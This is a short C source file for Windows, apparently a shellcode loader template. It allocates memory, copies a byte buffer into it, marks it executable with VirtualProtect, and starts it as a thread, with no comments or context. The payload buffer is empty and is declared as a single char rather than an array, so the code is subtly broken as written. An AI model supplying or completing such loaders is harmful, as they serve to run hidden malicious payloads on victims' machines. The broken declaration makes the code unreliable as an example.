#include <Windows.h>

const unsigned char buf = {};

int main(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE hThread;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlCopyMemory(exec_mem, buf, sizeof(buf));

    rv = VirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldprotect);

    if (rv != 0) {
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
        WaitForSingleObject(hThread, -1);
    }

    return 0;
}